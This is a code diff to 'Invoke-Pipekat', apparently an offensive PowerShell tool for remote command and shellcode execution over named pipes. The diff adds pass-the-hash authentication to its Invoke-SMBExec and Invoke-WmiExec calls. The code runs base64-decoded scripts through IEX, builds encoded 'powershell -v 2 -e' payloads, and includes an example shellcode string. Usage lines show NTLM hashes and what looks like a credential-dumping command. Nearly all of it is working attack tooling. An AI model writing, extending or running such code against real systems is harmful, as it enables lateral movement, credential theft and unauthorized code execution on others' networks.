@@ -29,7 +29,12 @@ Invoke-Pipekat -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Command "lsad
 Invoke-Pipekat -Target 10.0.0.1 -Username Admin -Hash 4E3254E32556AE56AE -Domain . -Shellcode ZnVuY3Rpb24gSW52b2tlL
 
 #>
-param($Command, $Username, $Password, $Domain, $Target, $Shellcode, [bool]$PSexec = $False)
+param($Command, $Username, $Password, $Domain, $Hash, $Target, $Shellcode, [bool]$PSexec = $False)
+
+if(!$Username) {echo "No username supplied...."; return}
+if(!$Domain) {echo "No domain supplied...."; return}
+if((!$Password) -and (!$Hash)) {echo "No password/hash supplied...."; return}
+if(($Password) -and ($Hash)) {echo "Cannot use both a hash and a password...."; return}
 
 add-Type -assembly "System.Core"
 
@@ -175,7 +180,11 @@ if ($PSexec) {
 $smbexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($smbexec))
 IEX $smbexecw
 echo "`n[+] Running Invoke-SMBExec with the supplied credentials"
+if ($hash){
+$smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Hash `"$hash`" -Command `"$payloadraw`""
+} else {
 $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Password `"$password`" -Command `"$payloadraw`""
+}
 IEX $smbcmd
 
 } else {
@@ -183,7 +192,11 @@ IEX $smbcmd
 $wmiexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wmiexec))
 IEX $wmiexecw
 echo "`n[+] Running Invoke-WMIExec with the supplied credentials"
+if ($hash){
+$wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Hash `"$hash`" -Command `"$payloadraw`""
+} else {
 $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Password `"$password`" -Command `"$payloadraw`""
+}
 IEX $wmicmd
 
 }
@@ -198,7 +211,7 @@ $pl = Decrypt-String -key $pipekey -encryptedStringWithIV $wp
 $pl
 
 } else {
-
+if($Hash) {echo "Cannot use a hash when executing shellcode remotely as it rquired the password to create a pipe session...."; return}
 $pipekat = @"
 `$pipeName = "$pipeName"
 
@@ -327,7 +340,7 @@ $pl
 if (!$Target) {
 $Target = "localhost"
 }
-
+if($Hash) {echo "Cannot use a hash when executing shellcode remotely as it rquired the password to create a pipe session...."; return}
 echo "[+] Shellcode being executed"
 
 $pipekat = @"
@@ -358,21 +371,28 @@ $Bytes = [System.Text.Encoding]::Unicode.GetBytes($pipekat)
 $payloadraw = 'cmd /c powershell -v 2 -e '+[Convert]::ToBase64String($bytes)
 
 if ($PSexec) {
-echo "[-] There are unresolved running this remotely using PSEXEC, falling back to Invoke-WMI for remote targets"
-$wmiexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wmiexec))
-IEX $wmiexecw
-echo "`n[+] Running Invoke-WMIExec with the supplied credentials"
-$wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Password `"$password`" -Command `"$payloadraw`""
-IEX $wmicmd
+    $smbexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($smbexec))
+    IEX $smbexecw
+    echo "`n[+] Running Invoke-SMBExec with the supplied credentials"
+    if ($hash){
+    $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Hash `"$hash`" -Command `"$payloadraw`""
+    } else {
+    $smbcmd = "Invoke-SMBExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Password `"$password`" -Command `"$payloadraw`""
+    }
+    IEX $smbcmd
 } else {
-$wmiexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wmiexec))
-IEX $wmiexecw
-echo "`n[+] Running Invoke-WMIExec with the supplied credentials"
-$wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Password `"$password`" -Command `"$payloadraw`""
-IEX $wmicmd
+    $wmiexecw = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($wmiexec))
+    IEX $wmiexecw
+    echo "`n[+] Running Invoke-WMIExec with the supplied credentials"
+    if ($hash){
+    $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Hash `"$hash`" -Command `"$payloadraw`""
+    } else {
+    $wmicmd = "Invoke-WmiExec -Target `"$target`" -Domain `"$domain`" -Username `"$username`" -Password `"$password`" -Command `"$payloadraw`""
+    }
+    IEX $wmicmd
 }
 
-# example shellcode that runs calc
+# example shellcode that runs netsh.exe
 #$Shellcode = "/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1qAY2FsgAAAFBoMYtvh//Vu/C1olZoppW9nf/VPAZ8CoD74HUFu0cTcm9qAFP/1W5ldHNoLmV4ZQA="
 
 $sc32 = @"
